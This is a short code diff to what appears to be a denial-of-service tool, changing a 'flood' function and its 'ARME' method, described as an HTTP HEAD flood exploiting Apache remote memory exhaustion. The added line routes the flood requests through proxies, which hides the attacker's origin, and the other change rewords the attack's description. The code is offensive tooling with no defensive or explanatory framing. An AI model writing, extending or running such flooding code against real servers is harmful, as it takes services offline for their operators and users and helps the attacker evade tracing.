@@ -46,6 +46,7 @@ def flood(attack_id, url, stoptime) -> None:
                 allow_redirects=False,
                 stream=False,
                 cert=None,
+                proxies=utils().get_proxy()
             )
 
             Core.infodict[attack_id]['req_sent'] += 1
@@ -60,7 +61,7 @@ def flood(attack_id, url, stoptime) -> None:
 
 Core.methods.update({
     'ARME': {
-        'info': 'HTTP HEAD flood which exploits a vulnerability in Apache',
+        'info': 'HTTP Apache Remote Memory Exhaustation (ARME) flood',
         'func': flood
     }
 })
